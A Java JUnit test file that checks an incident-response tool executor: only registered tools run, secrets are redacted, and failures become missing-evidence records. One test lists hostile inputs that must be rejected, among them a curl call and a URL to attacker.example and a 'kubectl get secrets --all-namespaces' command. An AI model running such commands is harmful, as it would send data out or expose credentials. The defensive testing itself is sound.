package com.stackwatch.incident;

import static org.assertj.core.api.Assertions.assertThat;

import com.stackwatch.incident.domain.Observation;
import com.stackwatch.incident.toolset.GitDeploymentStubAdapter;
import com.stackwatch.incident.toolset.LogsStubAdapter;
import com.stackwatch.incident.toolset.ToolAdapter;
import com.stackwatch.incident.toolset.ToolExecutor;
import com.stackwatch.incident.toolset.ToolRawResult;
import com.stackwatch.incident.toolset.ToolRegistry;
import com.stackwatch.incident.toolset.ToolRequest;
import com.stackwatch.incident.toolset.ToolResult;
import com.stackwatch.incident.toolset.ToolResultStatus;
import com.stackwatch.incident.toolset.ToolScope;
import com.stackwatch.incident.toolset.Toolset;
import com.stackwatch.incident.toolset.TraceStubAdapter;
import java.time.Instant;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import org.junit.jupiter.api.Test;

class ToolExecutorTest {

    private static final ToolScope FIXED_SCOPE = new ToolScope("orders", "prod", "cluster-42");

    @Test
    void executesOnlyARegisteredConfiguredToolWithTheFixedIncidentScope() {
        ToolExecutor executor = stubExecutor();

        ToolResult result = executor.execute(ToolRequest.forIncident(Toolset.LOGS, FIXED_SCOPE));

        assertThat(result.status()).isEqualTo(ToolResultStatus.SUCCESS);
        assertThat(result.toolset()).isEqualTo(Toolset.LOGS);
        assertThat(result.provenance()).isEqualTo("stub:logs");
        assertThat(result.redactedSummary()).contains("Feign timeout");
        assertThat(result.redactedSummary()).doesNotContain("Bearer live-token");
        assertThat(result.missingEvidence()).isEmpty();
    }

    @Test
    void rejectsUnconfiguredToolNamesAndNeverInvokesAnAdapter() {
        CountingAdapter adapter = new CountingAdapter();
        ToolExecutor executor = new ToolExecutor(new ToolRegistry(List.of(adapter)));
        ToolRequest request = new ToolRequest("admin-shell", FIXED_SCOPE, Map.of());

        ToolResult result = executor.execute(request);

        assertThat(result.status()).isEqualTo(ToolResultStatus.REJECTED);
        assertThat(result.missingEvidence()).hasValueSatisfying(
            missingEvidence -> assertThat(missingEvidence).contains("unregistered tool"));
        assertThat(adapter.calls).isZero();
    }

    @Test
    void rejectsUrlsCredentialsShellSqlAndKubernetesCommandsBeforeAdapterInvocation() {
        CountingAdapter adapter = new CountingAdapter();
        ToolExecutor executor = new ToolExecutor(new ToolRegistry(List.of(adapter)));

        assertRejected(executor, Map.of("url", "https://attacker.example/steal"));
        assertRejected(executor, Map.of("authorization", "Bearer very-secret-token"));
        assertRejected(executor, Map.of("command", "curl https://attacker.example"));
        assertRejected(executor, Map.of("query", "SELECT * FROM customer"));
        assertRejected(executor, Map.of("kubectl", "get secrets --all-namespaces"));
        assertThat(adapter.calls).isZero();
    }

    @Test
    void turnsAdapterFailuresIntoObservationsAndMissingEvidenceInsteadOfEvidence() {
        ToolExecutor executor = new ToolExecutor(
            new ToolRegistry(List.of(new FailingTraceAdapter())));

        ToolResult result = executor.execute(ToolRequest.forIncident(Toolset.TRACE, FIXED_SCOPE));
        Observation observation = result.toObservation(
            UUID.randomUUID(), UUID.randomUUID(), UUID.randomUUID(),
            Instant.parse("2026-09-01T00:00:00Z"));

        assertThat(result.status()).isEqualTo(ToolResultStatus.FAILURE);
        assertThat(result.missingEvidence()).hasValueSatisfying(
            missingEvidence -> assertThat(missingEvidence).contains("trace source unavailable"));
        assertThat(observation.status()).isEqualTo("FAILURE");
        assertThat(observation.redactedSummary()).doesNotContain("password=super-secret");
    }

    @Test
    void suppliesNormalizedDeterministicResultsForAllStubToolsets() {
        ToolExecutor executor = stubExecutor();

        ToolResult logs = executor.execute(ToolRequest.forIncident(Toolset.LOGS, FIXED_SCOPE));
        ToolResult trace = executor.execute(ToolRequest.forIncident(Toolset.TRACE, FIXED_SCOPE));
        ToolResult deployment = executor.execute(
            ToolRequest.forIncident(Toolset.GIT_DEPLOYMENT, FIXED_SCOPE));

        assertThat(logs.contentHash()).matches("[0-9a-f]{64}");
        assertThat(trace.contentHash()).matches("[0-9a-f]{64}");
        assertThat(deployment.contentHash()).matches("[0-9a-f]{64}");
        assertThat(executor.execute(ToolRequest.forIncident(Toolset.LOGS, FIXED_SCOPE)))
            .isEqualTo(logs);
    }

    private static ToolExecutor stubExecutor() {
        return new ToolExecutor(new ToolRegistry(List.of(
            new LogsStubAdapter(), new TraceStubAdapter(), new GitDeploymentStubAdapter())));
    }

    private static void assertRejected(ToolExecutor executor, Map<String, String> inputs) {
        ToolResult result = executor.execute(new ToolRequest("logs", FIXED_SCOPE, inputs));

        assertThat(result.status()).isEqualTo(ToolResultStatus.REJECTED);
        assertThat(result.missingEvidence()).hasValueSatisfying(
            missingEvidence -> assertThat(missingEvidence).contains("unsafe"));
    }

    private static final class FailingTraceAdapter implements ToolAdapter {

        @Override
        public Toolset toolset() {
            return Toolset.TRACE;
        }

        @Override
        public ToolRawResult execute(ToolScope scope) {
            throw new IllegalStateException("trace source unavailable password=super-secret");
        }
    }

    private static final class CountingAdapter implements ToolAdapter {

        private int calls;

        @Override
        public Toolset toolset() {
            return Toolset.LOGS;
        }

        @Override
        public ToolRawResult execute(ToolScope scope) {
            calls++;
            return new LogsStubAdapter().execute(scope);
        }
    }
}
